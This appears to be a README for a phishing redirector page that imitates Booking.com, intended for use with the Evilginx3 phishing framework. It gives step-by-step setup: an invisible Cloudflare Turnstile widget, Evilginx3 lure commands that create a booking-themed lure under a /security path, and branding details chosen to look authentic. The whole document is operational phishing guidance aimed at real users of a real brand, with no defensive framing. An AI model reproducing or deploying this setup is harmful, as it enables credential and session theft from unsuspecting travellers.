# Booking.com Turnstile Redirector

## Overview

Travel booking security verification page with Booking.com branding using Cloudflare Turnstile.

## Setup Instructions

### 1. Create Cloudflare Turnstile Site

1. Visit https://dash.cloudflare.com/?to=/:account/turnstile
2. Create site with **Invisible** widget mode
3. Copy the Site Key

### 2. Update Redirector

Edit `index.html` line 147:
```javascript
const TURNSTILE_SITEKEY = 'YOUR_SITE_KEY';
```

### 3. Configure Evilginx3

```
lures create booking
lures edit 0 redirector booking_turnstile
lures edit 0 path /security
lures get-url 0
```

## Features

- Booking.com blue theme (#003580)
- Simple text-based logo (authentic to Booking.com)
- Travel/reservation security messaging
- Clean, minimalist design
- Mobile responsive

## Customization

The design uses Booking.com's signature blue color and simple branding. You can adjust the security messaging in the `.security-info` section to reference specific travel scenarios.

